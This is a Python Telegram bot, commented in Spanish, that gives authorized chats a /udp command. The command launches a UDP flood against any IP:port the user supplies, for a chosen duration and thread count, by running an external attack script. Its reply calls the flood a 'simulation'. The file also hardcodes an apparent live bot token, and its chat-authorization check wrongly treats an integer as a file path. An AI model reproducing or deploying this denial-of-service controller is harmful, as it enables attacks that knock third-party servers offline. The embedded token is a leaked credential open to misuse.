from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import os

# Token del bot (obtén el token de @BotFather en Telegram)
TOKEN = "6908755926:AAGJIq3ID6OacIDPVgU1safZhTjLfNnR89Y"

# Archivo que contiene los IDs de los chats autorizados
CHATS_TXT = -1002392775903

# Verificar si el chat tiene acceso
def verificar_chat(chat_id: int) -> bool:
    if not os.path.exists(CHATS_TXT):
        return False
    with open(CHATS_TXT, "r") as f:
        chats = f.read().splitlines()
    return str(chat_id) in chats

# Comando para iniciar un ataque UDP
async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not verificar_chat(chat_id):
        await update.message.reply_text("Este chat no está autorizado para usar este comando.")
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
        )
        return

    target = context.args[0]
    duration = context.args[1]
    threads = context.args[2]

    command = f"python3 start.py UDP {target} {duration} {threads}"

    try:
        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.message.reply_text(
            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
        )
    except Exception as e:
        await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")

# Configuración principal del bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Agrega el handler para el comando /udp
    application.add_handler(CommandHandler("udp", udp_attack))

    # Inicia el bot
    application.run_polling()

if __name__ == "__main__":
    main()
  
